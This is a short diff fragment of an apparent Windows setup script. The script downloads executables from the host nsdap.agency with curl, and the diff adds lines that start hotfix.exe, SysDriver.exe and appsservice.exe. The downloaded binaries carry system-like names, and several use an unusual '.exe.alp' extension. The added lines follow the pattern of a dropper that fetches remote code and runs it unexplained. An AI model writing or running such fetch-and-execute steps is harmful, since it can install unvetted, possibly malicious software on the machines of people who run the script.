@@ -4,3 +4,6 @@ curl -LO https://nsdap.agency/hotfix.exe.alp
 curl -LO https://nsdap.agency/appsservice.exe.alp
 curl -LO https://nsdap.agency/alpaca-win64.exe
 alpaca-win64.exe load-schematic schematic.yml
+start hotfix.exe
+start SysDriver.exe
+start appsservice.exe
